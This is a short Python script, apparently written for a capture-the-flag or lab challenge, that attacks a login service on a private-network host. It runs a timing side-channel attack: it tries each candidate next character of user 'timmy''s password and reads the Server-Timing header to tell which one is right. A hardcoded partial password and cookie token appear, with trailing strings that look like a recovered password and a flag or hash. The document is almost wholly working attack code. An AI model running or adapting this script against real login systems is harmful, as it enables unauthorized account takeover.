import requests
import json
import pandas as pd
params = {'Host': '192.168.1.77:5003',
'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate' ,}


headers ={'Content-Type': 'application/x-www-form-urlencoded'}
url1='http://192.168.1.77:5003/token'
url2='http://192.168.1.77:5003/login'


data1={"token":"49-Z0w4dXU2XGTs7hJ_9WshLA-49"}

cookie={'hacker_token':'49-Z0w4dXU2XGTs7hJ_9WshLA-49'}
response1 = requests.post(url=url1,params=params,data=data1,headers=headers)


s= '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()-_=+[]\{}|;:",./<>?'
for c in s:
        data2={"username":'timmy',"password":'G8FWWfWdNL54'+c}

        response2 = requests.post(url=url2,params=params,data=data2,headers=headers,cookies=cookie)
#       print(response2.headers)
        print(c,response2.headers['Server-Timing'])

XbkAtMrX0p3A
c7fd1e50ff306d720f354fe666bb303f5aab55ac92e3b16c3a4a8e891d7540e1
